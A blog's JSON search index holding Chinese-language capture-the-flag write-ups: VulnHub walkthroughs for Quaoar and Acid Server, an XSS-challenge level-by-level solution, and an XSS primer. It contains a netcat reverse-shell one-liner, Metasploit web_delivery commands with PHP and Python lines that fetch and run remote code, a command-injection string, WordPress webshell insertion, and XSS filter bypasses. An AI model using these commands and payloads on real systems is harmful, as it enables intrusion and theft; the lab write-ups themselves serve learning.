{"meta":{"title":"Emerald Dream","subtitle":null,"description":null,"author":"chessur","url":"https://chirec.github.io","root":"/"},"pages":[],"posts":[{"title":"'BlackLight Walkthrogh'","slug":"BlackLight","date":"2019-05-15T07:13:33.000Z","updated":"2019-05-15T07:15:24.692Z","comments":true,"path":"2019/05/15/BlackLight/","link":"","permalink":"https://chirec.github.io/2019/05/15/BlackLight/","excerpt":"","text":"#","categories":[],"tags":[]},{"title":"'VulnHub Quaoar Walkthrough'","slug":"VulnHub-Quaoar","date":"2019-05-14T10:28:24.000Z","updated":"2019-05-15T09:44:03.521Z","comments":true,"path":"2019/05/14/VulnHub-Quaoar/","link":"","permalink":"https://chirec.github.io/2019/05/14/VulnHub-Quaoar/","excerpt":"1. Goal","text":"1. Goal 1234567难度：非常简单提示使用工具：namp、dirbuster、nikto、wpscan、hydra有3个flag1.获得Shell2.获得root权限3.在box里有一个后渗透的flag 2. 信息收集Nmap robots.txt查看robots.txt robots.txt里有wordpress的目录 访问/wordpress 管理员登录页面&lt;http://192.168.126.162/wordpress/wp-login.php&gt; 弱口令admin:admin登录 修改WordPress模板插入一句话 使用菜刀连WebShell 3. 渗透反弹Shell服务端 1rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.126.126 8126 &gt;/tmp/f 攻击端 1nc -lp 8126 查找敏感信息查看目录信息 查看wordpress配置信息 获得数据库用户名和密码 12user:rootpassword:rootpassword! 查看端口开放情况 数据库是mysql数据库 反弹的Shell无法登录mysql，输入密码之后，就卡住不动了 尝试用数据库密码ssh连接靶机 在root目录下，获得第一个flag 查找flag 在wpadmin用户目录下获得第二个flag.txt 在登录界面提示上有一个后开发的flag，还有一个flag 登录mysql，查看mysql.user 这篇WalkThrough CTF WALKTHROUGH – HACKFEST2016: QUAOAR (VULNHUB)，找到了第三个flag，在/etc/cron.d/php5文件里 4. 总结1.查看robots.txt2.多收集工具，这个靶场可以用WPForce直接上传WebShell3.密码习惯，很多人都会使用同一个密码，这个靶场Linux的root密码和数据库的root密码是一样的4.熟悉各个CMS后台写入webshell的方法5.使用菜刀的虚拟终端用python或php反弹shell有时会失败6.cron是Linux的计划任务 5. 参考[1] CTF WALKTHROUGH – HACKFEST2016: QUAOAR (VULNHUB)","categories":[],"tags":[{"name":"VulnHub","slug":"VulnHub","permalink":"https://chirec.github.io/tags/VulnHub/"}]},{"title":"'VulnHub Acid Server Walkthrough'","slug":"VulnHub-Acid-Server","date":"2019-05-13T14:09:09.000Z","updated":"2019-05-14T13:40:38.706Z","comments":true,"path":"2019/05/13/VulnHub-Acid-Server/","link":"","permalink":"https://chirec.github.io/2019/05/13/VulnHub-Acid-Server/","excerpt":"1. 查看IP地址由于不知道靶场的登录密码，所以需要使用其他工具获取IP 这里使用Kali自带的一个工具netdiscover","text":"1. 查看IP地址由于不知道靶场的登录密码，所以需要使用其他工具获取IP 这里使用Kali自带的一个工具netdiscover 123456789101112131415161718Usage: netdiscover [-i device] [-r range | -l file | -p] [-m file] [-s time] [-n node] [-c count] [-f] [-d] [-S] [-P] [-c] -i device: your network device -r range: scan a given range instead of auto scan. 192.168.6.0/24,/16,/8 -l file: scan the list of ranges contained into the given file -p passive mode: do not send anything, only sniff -m file: scan the list of known MACs and host names -F filter: Customize pcap filter expression (default: &quot;arp&quot;) -s time: time to sleep between each arp request (milliseconds) -n node: last ip octet used for scanning (from 2 to 253) -c count: number of times to send each arp reques (for nets with packet loss) -f enable fastmode scan, saves a lot of time, recommended for auto -d ignore home config files for autoscan and fast mode -S enable sleep time supression between each request (hardcore mode) -P print results in a format suitable for parsing by another program -N Do not print header. Only valid when -P is enabled. -L in parsable output mode (-P), continue listening after the active scan is completedIf -r, -l or -p are not enabled, netdiscover will scan for common lan addresses. 执行 1netdiscover -r 192.168.126.0/24 查询VMware的Nat模式下的子网 找到了靶机的IP192.168.126.161 2. 扫描靶机端口使用Nmap扫描靶机端口 1nmap -sS -T4 -sV -O -p- 192.168.126.161 扫描结果 扫描发现靶机开放端口为33447 访问http://192.168.126.161:33447 3. Web网页的标题是/Challenge看起来是目录先把地址丢到DirBuster里去跑 查看网页源代码，在末尾发现十六进制字符串&lt;!--0x643239334c6d70775a773d3d--&gt;，解码后发现是base64编码格式d293LmpwZw==，再经过base64解码发现是一个图片wow.jpg，尝试在主页访问图片，并没有这个图片 这时，查看DirBuster 发现标题确实是目录名访问/Challenge，需要用邮箱和密码登录继续访问扫描出来的目录，发现cake.php页面的标题也是目录名/Magic_Box将目录改为/Challenge/Magic_Box，继续进行目录扫描 在扫描结果里看到了/images目录，将wow.jpg放在里面打开 使用WinHex打开图片，在末尾发现;37:61:65:65:30:66:36:64:35:38:38:65:64:39:39:30:35:65:65:33:37:66:31:36:61:37:63:36:31:30:64:34使用BurpSuite自带的Ascii Hex进行解码得到7aee0f6d588ed9905ee37f16a7c610d4，看起来像MD5加密后的字符串将字符串丢到MD5解密 获得63425可能是密码，不过图片这条线就到这里结束了 再回去看DirBuster扫描结果 访问/Challenge/Magic_Box/command.php 是一个可以执行ping命令的页面，输入Kali的IP地址测试一下 发现页面没有发生变化，查看页面源代码后发现结果在上方空白处 尝试命令执行注入 1192.168.126.126;ls 存在命令执行注入，可以反弹Shell进一步渗透 3.1 另一种思路对于cake.php页面还有另一种获取方法，From:CTF WALKTHROUGH – ACID: SERVER (VULNHUB) 在/Challenge/index.php页面的源代码中，可以发现&lt;!DOCTYPE gkg.qvpn html&gt; 使用ROT13解密得到txt.dica，反过来是acid.txt，访问/Challenge/acid.txt 又获得一个页面protected_page.php，打开之后发现没有权限访问 再回到/Challenge/index.php页面的源代码中，可以找到js/forms.js打开发现在文件中有版权信息 使用Google搜索peredur.net form_js 第一条就是该项目在GitHub上的仓库 进去之后，发现这是一个已经很久没有更新的项目，并且在Readme里写了作者没有时间更新，希望有人接手的信息，这些信息对我们没有什么用。在commits里查看Readme的更新 在Modified the README.md file中可以看到初始用户名和密码 123Username : test_user Email : test@example.com Password : 6ZaxN2Vzm9NUJT2y 使用这组密码登录Challenge/index.php，成功登录 就是之前发现的protected_page.php页面提示点击这里继续深入 点击之后，发现跳转到了/Challenge/include.php页面，页面自带本地包含功能，输入/etc/passwd，页面没有变化，查看源代码可以发现包含成功 可以看到acid和saman的用户ID 在源代码的最下面依然存在这一行被注释掉的十六进制字符串&lt;!--0x5933566a4c6e4a34626e413d--&gt; 按照之前的解密方式，解密获得cuc.rxnp，再经过ROT13解密获得php.ekac，反过来是cake.php，后续操作和第一种方法一样 4. 渗透Challenge/Magic_Box/command.php页面的标题是Reverse Kunfu，提示反弹Shell 使用MSF反弹Shell 12345678910msf5 &gt; use exploit/multi/script/web_deliverymsf5 exploit(multi/script/web_delivery) &gt; set lhost 192.168.126.126lhost =&gt; 192.168.126.126msf5 exploit(multi/script/web_delivery) &gt; set lport 8126lport =&gt; 8126msf5 exploit(multi/script/web_delivery) &gt; set srvport 7777srvport =&gt; 7777msf5 exploit(multi/script/web_delivery) &gt; set payload python/meterpreter/reverse_tcppayload =&gt; python/meterpreter/reverse_tcpmsf5 exploit(multi/script/web_delivery) &gt; run PHP 1php -d allow_url_fopen=true -r &quot;eval(file_get_contents(&apos;http://192.168.126.126:2626/qNRqp3NMPx&apos;));&quot; python 1python -c &quot;import sys;u=__import__(&apos;urllib&apos;+&#123;2:&apos;&apos;,3:&apos;.request&apos;&#125;[sys.version_info[0]],fromlist=(&apos;urlopen&apos;,));r=u.urlopen(&apos;http://192.168.126.126:7777/aSEchhTZ&apos;);exec(r.read());&quot; 在Challenge/Magic_Box/command.php页面输入 1;python -c &quot;import sys;u=__import__(&apos;urllib&apos;+&#123;2:&apos;&apos;,3:&apos;.request&apos;&#125;[sys.version_info[0]],fromlist=(&apos;urlopen&apos;,));r=u.urlopen(&apos;http://192.168.126.126:7777/aSEchhTZ&apos;);exec(r.read());&quot; Kali中MSF获得Shell 查看id 接下来查找敏感信息，看能否提升权限 在根目录下发现一个s.bin目录，里面有一个investigate.php的文件，查看其内容 123&lt;?phpecho &quot;Now you have to behave like an investigator to catch the culprit\\n&quot;;?&gt; 查看root,acid,saman的家目录 在acid的家目录加看到一个名为.sudo_as_admin_successful大小为0的文件，提示普通用户可以切换为root用户 查找acid这个用户的文件来获取他的密码来切换账户 1find / -user acid 2&gt;/dev/null 第一个是hint.pcapng文件，是一个流量包使用python搭建Server下载下来进行流量分析 1python -m SimpleHTTPServer 12600 使用WireShark打开，是一个由6400条记录的流量包 分析TCP协议，可以发现一段明文传输的对话 12345678heya helloWhat was the name of the Culprit??? saman and nowadays he&apos;s known by the alias of 1337hax0roh Fuck Great Now, we gonna Catch Him Soon :D Yes We have to !! The mad bomber is on a rageOhkcya Over and Out 找到了saman用户，以及他的别名1337hax0r，猜测这可能是他的密码 尝试切换rootsudo su 查找资料发现是ssh连接的原因，使用Kali切换 查看Flag 5. 总结1.netdiscover使用2.多看页面源码，注意源码长度3.查找用户文件find / -user 2&gt;/dev/null4.MSF反弹Shell模块exploit/multi/script/web_delivery5.尝试查找初始用户和初始密码 6. 参考[1] Acid: Server [2] CTF WALKTHROUGH – ACID: SERVER (VULNHUB) [2] 2018-09-14-Vulnhub渗透测试实战writeup(1) [3] Vulnhub Acid","categories":[],"tags":[{"name":"VulnHub","slug":"VulnHub","permalink":"https://chirec.github.io/tags/VulnHub/"}]},{"title":"'Upload-Labs'","slug":"Upload-Labs","date":"2019-05-13T00:30:33.000Z","updated":"2019-05-13T00:30:33.628Z","comments":true,"path":"2019/05/13/Upload-Labs/","link":"","permalink":"https://chirec.github.io/2019/05/13/Upload-Labs/","excerpt":"","text":"","categories":[],"tags":[]},{"title":"'XSS-Challenge'","slug":"XSS-Challenge","date":"2019-05-13T00:29:35.000Z","updated":"2019-05-15T07:09:29.682Z","comments":true,"path":"2019/05/13/XSS-Challenge/","link":"","permalink":"https://chirec.github.io/2019/05/13/XSS-Challenge/","excerpt":"Level 1通过GET方式传入name，会在页面上显示出来 写入payload","text":"Level 1通过GET方式传入name，会在页面上显示出来 写入payload 12345&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;name&quot;];echo &quot;&lt;h2 align=center&gt;欢迎用户&quot;.$str.&quot;&lt;/h2&gt;&quot;;?&gt; 在代码中没有看到过滤、转义，直接将输入显示在页面上 Level 2通过GET方式传入keyword，会在页面上显示出来 并且在&lt;form&gt;标签的value属性上也会显示输入 尝试写入payload，发现没有正确的显示出来 使用Firebug查看，发现&lt;h2&gt;标签中的输入被HTML实体化编码 &lt;form&gt;标签中value属性的值同样被HTML实体化，不过由于在标签内部，所以可以使用事件触发xss，而不需要加上会被转义的&lt;&gt; payload 12345678910&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;keyword&quot;];echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&apos;&lt;center&gt;&lt;form action=level2.php method=GET&gt;&lt;input name=keyword value=&quot;&apos;.$str.&apos;&quot;&gt;&lt;input type=submit name=submit value=&quot;搜索&quot;/&gt;&lt;/form&gt;&lt;/center&gt;&apos;;?&gt; 查看代码，可以看到htmlspecialchars()对输入进行了转义 Level 3通过GET方式传入keyword，显示方式和Level 2相同，在&lt;h2&gt;和&lt;form&gt;标签上显示 输入Level 2的payload，发现没有成功闭合 使用&#39;代替&quot;，成功闭合 payload 12345678910&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;keyword&quot;];echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&quot;&lt;center&gt;&lt;form action=level3.php method=GET&gt;&lt;input name=keyword value=&apos;&quot;.htmlspecialchars($str).&quot;&apos;&gt;&lt;input type=submit name=submit value=搜索 /&gt;&lt;/form&gt;&lt;/center&gt;&quot;;?&gt; 代码上和第二关不同的地方在于，value=属性后引号变成了单引号，所以需要使用&#39;进行闭合。由于浏览器会将&#39;变为&quot;显示，所以使用Firebug审查元素时，无法区分 Level 4通过GET方式传入keyword，显示方式和Level 2略有不同，在&lt;h2&gt;标签上显示和输入的是相同的，不过依然被HTML实体化，而在&lt;form&gt;标签上显示的没有&lt;&gt; 使用Level 2的payload 123456789101112&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;keyword&quot;];$str2=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str);$str3=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str2);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&apos;&lt;center&gt;&lt;form action=level4.php method=GET&gt;&lt;input name=keyword value=&quot;&apos;.$str3.&apos;&quot;&gt;&lt;input type=submit name=submit value=搜索 /&gt;&lt;/form&gt;&lt;/center&gt;&apos;;?&gt; 可以看到str3是被过滤掉&lt;&gt;的，不过由于使用的on事件，而且本身在标签内部，所以不需要使用&lt;&gt; Level 5测试显示效果 使用Level 2的payload on事件被过滤为o_n O_o 使用javascript:alert(/xss/)绕过 payload 123456789101112&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = strtolower($_GET[&quot;keyword&quot;]);$str2=str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str);$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&apos;&lt;center&gt;&lt;form action=level5.php method=GET&gt;&lt;input name=keyword value=&quot;&apos;.$str3.&apos;&quot;&gt;&lt;input type=submit name=submit value=搜索 /&gt;&lt;/form&gt;&lt;/center&gt;&apos;;?&gt; 查看代码，发现不仅过滤了on，还过滤了&lt;script，不过str3没有进行HTML实体化转义 Level 6测试显示效果 两个输出点的&lt;&gt;都被HTML实体编码 测试on事件 使用&quot;闭合，on被过滤为o_n 测试javascript:alert() 这里href也被过滤了，变成了hr_ef。有个奇怪的地方，刚才测试显示效果时&lt;&gt;被转义掉，但这次并没有被转义掉 被过滤掉的还有src、script 然后发现大小写可以绕过，明明前面都不能绕过的 payload 123456789101112131415&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;keyword&quot;];$str2=str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str);$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&apos;&lt;center&gt;&lt;form action=level6.php method=GET&gt;&lt;input name=keyword value=&quot;&apos;.$str6.&apos;&quot;&gt;&lt;input type=submit name=submit value=搜索 /&gt;&lt;/form&gt;&lt;/center&gt;&apos;;?&gt; 查看代码发现&lt;script、on、src、data、href都被过滤，但是并没有strtolower()函数过滤大小写 Level 7测试显示效果这次使用带&lt;Chessur&gt;测试显示效果，发现变成小写了 测试on事件发现下面的on被过滤为空 尝试双写绕过 123456789101112131415&lt;?php ini_set(&quot;display_errors&quot;, 0);$str =strtolower( $_GET[&quot;keyword&quot;]);$str2=str_replace(&quot;script&quot;,&quot;&quot;,$str);$str3=str_replace(&quot;on&quot;,&quot;&quot;,$str2);$str4=str_replace(&quot;src&quot;,&quot;&quot;,$str3);$str5=str_replace(&quot;data&quot;,&quot;&quot;,$str4);$str6=str_replace(&quot;href&quot;,&quot;&quot;,$str5);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&apos;&lt;center&gt;&lt;form action=level7.php method=GET&gt;&lt;input name=keyword value=&quot;&apos;.$str6.&apos;&quot;&gt;&lt;input type=submit name=submit value=搜索 /&gt;&lt;/form&gt;&lt;/center&gt;&apos;;?&gt; 查看代码，这一关又有大小写过滤了….将关键词替换为空，所以双写直接绕过 Level 8看起来像DOM型XSS 测试显示效果这次有2个输出点，一个是&lt;form&gt;标签里，一个是在&lt;a&gt;标签里 查看过滤情况发现on、script、src都被过滤掉了，而且大小写无法绕过 由于输出点在href属性中，所以使用&lt;a href=javascript:alert()&lt;/a&gt;使用&amp;#x0A;来绕过过滤 payload 12345678910111213141516&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = strtolower($_GET[&quot;keyword&quot;]);$str2=str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);$str7=str_replace(&apos;&quot;&apos;,&apos;&amp;quot&apos;,$str6);echo &apos;&lt;center&gt;&lt;form action=level8.php method=GET&gt;&lt;input name=keyword value=&quot;&apos;.htmlspecialchars($str).&apos;&quot;&gt;&lt;input type=submit name=submit value=添加友情链接 /&gt;&lt;/form&gt;&lt;/center&gt;&apos;;?&gt; 查看代码，script、on、src、data、href、&quot;都被过滤掉了 Level 9测试显示效果使用了新的测试payload 1&quot;;!–&apos;&lt;CheSSur&gt;=&amp;&#123;(OnonSrcsrcscriptScRIPt)&#125; 大小写转为小写，没有过滤，有HTML实体编码转义在href标签处会判断链接是否合法判断链接是否合法的规则是输入中是否有http:// 使用Level 8的payload加上//http:// 1234567891011121314151617181920212223242526&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = strtolower($_GET[&quot;keyword&quot;]);$str2=str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);$str7=str_replace(&apos;&quot;&apos;,&apos;&amp;quot&apos;,$str6);echo &apos;&lt;center&gt;&lt;form action=level9.php method=GET&gt;&lt;input name=keyword value=&quot;&apos;.htmlspecialchars($str).&apos;&quot;&gt;&lt;input type=submit name=submit value=添加友情链接 /&gt;&lt;/form&gt;&lt;/center&gt;&apos;;?&gt;&lt;?phpif(false===strpos($str7,&apos;http://&apos;))&#123; echo &apos;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;您的链接不合法？有没有！&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&apos;; &#125;else&#123; echo &apos;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&apos;.$str7.&apos;&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&apos;;&#125;?&gt; 查看代码发现和Level 8基本相同，在下面添加了判断URL是否合法的规则，不过由于使用的是strpos()函数，只判断字符串中是否出现过字符，而没有判断出现位置，所以可以添加到行尾，使用注释符注释掉进行绕过 Level 10测试显示效果进行了HTML实体化编码转义，对on、src、script进行了过滤 但是在&lt;h2标签下面有隐藏的&lt;form&gt;标签，测试发现只有t_sort可以被更改type显示出来 payload 1234567891011121314&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;keyword&quot;];$str11 = $_GET[&quot;t_sort&quot;];$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&apos;&lt;center&gt;&lt;form id=search&gt;&lt;input name=&quot;t_link&quot; value=&quot;&apos;.&apos;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_history&quot; value=&quot;&apos;.&apos;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_sort&quot; value=&quot;&apos;.$str33.&apos;&quot; type=&quot;hidden&quot;&gt;&lt;/form&gt;&lt;/center&gt;&apos;;?&gt; 查看代码，发现t_sort接收从页面传来的值，过滤掉了&lt;&gt;，使用on事件绕过 Level 11测试显示效果 和Level 10类似，都有隐藏的&lt;form标签 从Level 10跳转来会看到Referer，直接打开并没有 使用FireFox浏览器无法修改为Payload，用BurpSuite抓包修改Referer Forward 12345678910111213141516&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;keyword&quot;];$str00 = $_GET[&quot;t_sort&quot;];$str11=$_SERVER[&apos;HTTP_REFERER&apos;];$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&apos;&lt;center&gt;&lt;form id=search&gt;&lt;input name=&quot;t_link&quot; value=&quot;&apos;.&apos;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_history&quot; value=&quot;&apos;.&apos;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_sort&quot; value=&quot;&apos;.htmlspecialchars($str00).&apos;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_ref&quot; value=&quot;&apos;.$str33.&apos;&quot; type=&quot;hidden&quot;&gt;&lt;/form&gt;&lt;/center&gt;&apos;;?&gt; 查看代码 $str11获取Referer，过滤掉了&lt;&gt;，再输出到t_ref Level 12直接用Firebug审查元素 看到了&lt;input name=&quot;t_ua&quot; value=&quot;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0&quot; type=&quot;hidden&quot;&gt; 用BurpSuite抓包修改UserAgent Forward 12345678910111213141516&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;keyword&quot;];$str00 = $_GET[&quot;t_sort&quot;];$str11=$_SERVER[&apos;HTTP_USER_AGENT&apos;];$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&apos;&lt;center&gt;&lt;form id=search&gt;&lt;input name=&quot;t_link&quot; value=&quot;&apos;.&apos;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_history&quot; value=&quot;&apos;.&apos;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_sort&quot; value=&quot;&apos;.htmlspecialchars($str00).&apos;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_ua&quot; value=&quot;&apos;.$str33.&apos;&quot; type=&quot;hidden&quot;&gt;&lt;/form&gt;&lt;/center&gt;&apos;;?&gt; 查看代码 $str11获取User Agent，过滤掉&lt;&gt;再输出到t_ua Level 13Firebug审查元素 看到t_cook 使用BurpSuite抓包 Forward 可以看到t_cook的值是Cookie中user的值 抓包修改Cookie Forward 1234567891011121314151617&lt;?php setcookie(&quot;user&quot;, &quot;call me maybe?&quot;, time()+3600);ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;keyword&quot;];$str00 = $_GET[&quot;t_sort&quot;];$str11=$_COOKIE[&quot;user&quot;];$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&apos;&lt;center&gt;&lt;form id=search&gt;&lt;input name=&quot;t_link&quot; value=&quot;&apos;.&apos;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_history&quot; value=&quot;&apos;.&apos;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_sort&quot; value=&quot;&apos;.htmlspecialchars($str00).&apos;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_cook&quot; value=&quot;&apos;.$str33.&apos;&quot; type=&quot;hidden&quot;&gt;&lt;/form&gt;&lt;/center&gt;&apos;;?&gt; $str11获取Cookie中的user，过滤掉&lt;&gt;再输出到t_cook Level 14使用Firebug审查元素 发现iframe标签，连接到http://www.exifviewer.org 以为要通过注入修改iframe标签，但查了一下是要上传xss图片到这个网页上，解析之后弹窗 1234567891011&lt;html&gt;&lt;head&gt;&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;&lt;title&gt;欢迎来到level14&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1 align=center&gt;欢迎来到level14&lt;/h1&gt;&lt;center&gt;&lt;iframe name=&quot;leftframe&quot; marginwidth=10 marginheight=10 src=&quot;http://www.exifviewer.org/&quot; frameborder=no width=&quot;80%&quot; scrolling=&quot;no&quot; height=80%&gt;&lt;/iframe&gt;&lt;/center&gt;&lt;center&gt;这关成功后不会自动跳转。成功者&lt;a href=/xsschallenge/level15.php?src=1.gif&gt;点我进level15&lt;/a&gt;&lt;/center&gt;&lt;/body&gt;&lt;/html&gt; 查看代码没有任何输入点，只能访问http://www.exifviewer.org Level 15测试显示效果 1&quot;;!–&apos;&lt;CheSSurOnonSrcsrcscriptScRIPt&gt;=&amp;&#123;()&#125; script被过滤为空格，空格被转义为&amp;nbsp;，大小写被过滤，src和on未被过滤，用&lt;img&gt;标签测试 发现/也被过滤成空格 使用%0a、%0c、%0d绕过空格检测 Level 17测试显示效果 闭合src Level 18测试显示效果 闭合src 总结1.使用on事件绕过&lt;&gt;的转义 Level 22.使用javascript:alert()绕过对on事件的过滤 Level 53.测试不应该跳过任何一步，XSS挑战的难度设计并不是线性增加的，有时上一关无效的payload，可能下一关就有用了 Level 64.输出点在&lt;a&gt;标签中，可以使用&lt;a href=javascript:alert()&lt;/a&gt;绕过 Level 85.使用&amp;#x0A;等制表符来绕过过滤 Level 86.判断输入是否合法，可以根据函数特性绕过，如strpos()函数 Level 97.查看源码是个好习惯，希望我有 Level 108.修改referer、user agent、cookie注入xsspayload Level 11，12，13 参考[1] 某xss挑战赛闯关笔记","categories":[],"tags":[]},{"title":"'XSS'","slug":"XSS","date":"2019-05-10T12:36:22.000Z","updated":"2019-05-15T05:50:26.553Z","comments":true,"path":"2019/05/10/XSS/","link":"","permalink":"https://chirec.github.io/2019/05/10/XSS/","excerpt":"XSS(Cross-Site script)跨站脚本攻击。XSS最大的特点就是能注入恶意的代码到用户浏览器的网页上，从而达到劫持用户会话的目的。是一种经常出现再web应用程序中的计算机安全漏洞，是由于web应用程序对用户的输入过滤不严而产生的。攻击者利用网站漏洞把恶意的脚本代码注入到网页中，当其他用户浏览这些网页时，就会执行其中的恶意代码，对受害用户可能采用cookie资料窃取，会话劫持，钓鱼欺骗等攻击手段。","text":"XSS(Cross-Site script)跨站脚本攻击。XSS最大的特点就是能注入恶意的代码到用户浏览器的网页上，从而达到劫持用户会话的目的。是一种经常出现再web应用程序中的计算机安全漏洞，是由于web应用程序对用户的输入过滤不严而产生的。攻击者利用网站漏洞把恶意的脚本代码注入到网页中，当其他用户浏览这些网页时，就会执行其中的恶意代码，对受害用户可能采用cookie资料窃取，会话劫持，钓鱼欺骗等攻击手段。 1. 基础知识1.1 Session服务器使用Session将用户身份信息临时保存在服务器上，用户离开网站后Session会被销毁。客户端使用Cookie保存SessionID。这种对用户身份信息存储的方式相对于Cookie来说，比较安全。 1.2 CookieCookie分为内存Cookie(临时型Cookie)和硬盘Cookie，内存Cookie储存在浏览器内存中，关闭浏览器则消失；硬盘Cookie以文本形式存储在硬盘上，由浏览器存取。Cookie由变量名与值组成，其属性里有标准的Cookie变量，也有用户自定义的属性。cookie格式：Set-Cookie:=[;=][;expiress=][;domain=][;path=][;secure][;httponly]cookie各个参数详细内容： Set-Cookie:http响应头，向客户端发送Cookie。 Name=value:每个Cookie必须包含的内容。 Expires=date:EXpires确定了Cookie的有效终止日期，可选。如果缺省，则Cookie不保存在硬盘中，只保存在浏览器内存中。 Domain=domain-name:确定了哪些inernet域中的web服务器可读取浏览器储存的Cookie，缺省为该web服务器域名。 Path=path:定义了web服务器哪些路径下的页面可获取服务器发送的Cookie。 Secure:在Cookie中标记该变量，表明只有为https通信协议时，浏览器才向服务器提交cookie。 Httponly:禁止javascript读取,如果Cookie中的一个参数带有httponly，则这个参数将不能被javascript获取；httponly可以防止xss会话劫持攻击。 1.3 会话劫持1.3.1 普通攻击步骤1.目标用户登录站点2.登录成功后，该用户会得到站点提供的一个会话标识SessionID3.攻击者通过某种攻击手段捕获Session ID4.攻击者通过捕获到的Session ID访问站点即可获得目标用户合法会话 1.3.2 获取SessionID的方式有多种1.暴力破解：尝试各种Session ID，直到破解为止2.预测：如果Session ID使用非随机的方式产生，那么就有可能计算出来3.窃取：使用网络嗅探(cain、ettercap)，XSS攻击等方法获得 1.4 会话固定会话固定（Session fixation）是一种诱骗受害者使用攻击者指定的会话标识（SessionID）的攻击手段。这是攻击者获取合法会话标识的最简单的方法。会话固定也可以看成是会话劫持的一种类型，原因是会话固定的攻击的主要目的同样是获得目标用户的合法会话，不过会话固定还可以是强迫受害者使用攻击者设定的一个有效会话，以此来获得用户的敏感信息。 1.4.1 攻击步骤1.攻击者通过某种手段重置目标用户的SessionID，然后监听用户会话状态；2.目标用户携带攻击者设定的Session ID登录站点；3.攻击者通过Session ID获得合法会话 1.5 攻击者重置SessionID的方式重置Session ID的方法同样也有多种，可以是跨站脚本攻击，如果是URL传递Session 